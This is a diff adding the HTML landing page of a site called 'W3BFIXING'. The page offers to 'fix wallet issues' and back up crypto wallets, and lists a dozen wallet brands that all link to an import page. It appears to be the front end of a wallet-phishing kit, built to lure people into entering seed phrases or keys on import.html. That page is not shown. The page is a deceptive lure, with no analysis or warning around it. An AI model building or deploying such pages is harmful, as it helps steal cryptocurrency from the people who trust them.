@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>W3BFIXING</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+
+    <style>
+      .containerr {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        margin: 20px;
+      }
+      .containerr a {
+        color: #4b5320;
+        font-weight: 500;
+      }
+      .item {
+        flex: 1 1 calc(25% - 20px);
+        box-sizing: border-box;
+        margin: 10px;
+        border: 1px solid #000;
+        border-radius: 5px;
+        padding: 20px;
+        text-align: center;
+        text-decoration: none;
+        color: inherit;
+        transition: transform 0.3s ease;
+      }
+
+      .item:hover {
+        transform: scale(1.05);
+        background-color: #f8f9fa;
+      }
+
+      /* Ensures that the items resize properly on smaller screens */
+      @media (max-width: 1200px) {
+        .item {
+          flex: 1 1 calc(33.33% - 20px);
+        }
+      }
+
+      @media (max-width: 800px) {
+        .item {
+          flex: 1 1 calc(50% - 20px);
+        }
+      }
+
+      @media (max-width: 500px) {
+        .item {
+          flex: 1 1 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-light bg-light">
+      <div class="container-fluid">
+        <a class="navbar-brand fw-bold" href="#">W3BFIXING</a>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarNav"
+          aria-controls="navbarNav"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+          <ul class="navbar-nav ms-auto">
+            <li class="nav-item">
+              <a class="nav-link active" aria-current="page" href="#">Home</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#schools">Stake</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <!-- Header -->
+    <header
+      class="text-white text-center py-5"
+      style="background-color: #4b5320"
+    >
+      <div class="container">
+        <h1 class="fw-bold">WELCOME TO W3BFIXING</h1>
+        <p>
+          <span class="fw-bold"
+            >This back-up ensures your digital account issue is rectified and
+            functional.</span
+          >
+          <br />
+          This app specializes in fixing wallet issues and providing secure
+          backup solutions. Your privacy and security are our top priorities.
+        </p>
+      </div>
+    </header>
+
+    <!-- Schools Section -->
+    <section id="schools" class="bg-light py-5">
+      <div class="container">
+        <h3 class="text-center mb-2" style="color: #4b5320">
+          Choose Wallet For Backup
+        </h3>
+
+        <p class="text-center mb-5">
+          <a href="connect.html">Stake</a> | <a href="connect.html">Unstake</a>
+        </p>
+        <div class="text-center">
+          <div class="row">
+            <div class="containerr">
+              <a href="import.html" class="item">METAMASK</a>
+              <a href="import.html" class="item">BYBIT</a>
+              <a href="import.html" class="item">SAFEPAL</a>
+              <a href="import.html" class="item">BITGET</a>
+              <a href="import.html" class="item">TRUST WALLET</a>
+              <a href="import.html" class="item">OKX WALLET</a>
+              <a href="import.html" class="item">ATOMIC WALLET</a>
+              <a href="import.html" class="item">COINBASE</a>
+              <a href="import.html" class="item">LEDGER</a>
+              <a href="import.html" class="item">EXODUS</a>
+              <a href="import.html" class="item">TOKEN POCKET</a>
+              <a href="import.html" class="item">EIDOO</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="text-center mt-4">
+          <button
+            class="btn text-white"
+            data-bs-toggle="modal"
+            data-bs-target="#moreModal"
+            style="background-color: #4b5320"
+          >
+            Other wallets
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- More Modal -->
+    <div
+      class="modal fade"
+      id="moreModal"
+      tabindex="-1"
+      aria-labelledby="moreModalLabel"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="moreModalLabel">
+              Add More Information
+            </h5>
+            <button
+              type="button"
+              class="btn-close"
+              data-bs-dismiss="modal"
+              aria-label="Close"
+            ></button>
+          </div>
+          <div class="modal-body">
+            <form>
+              <div class="mb-3">
+                <label for="additionalInfo" class="form-label"
+                  >Add W3BFIXING Name</label
+                >
+                <textarea
+                  class="form-control"
+                  id="additionalInfo"
+                  name="additionalInfo"
+                  rows="3"
+                  required
+                ></textarea>
+              </div>
+              <a
+                href="import.html"
+                class="btn text-white"
+                style="background-color: #4b5320"
+                >Submit</a
+              >
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer
+      class="text-white text-center py-4"
+      style="background-color: #4b5320"
+    >
+      <div class="container">
+        <p>&copy; 2024 W3BFIXING. All rights reserved.</p>
+      </div>
+    </footer>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+  </body>
+</html>
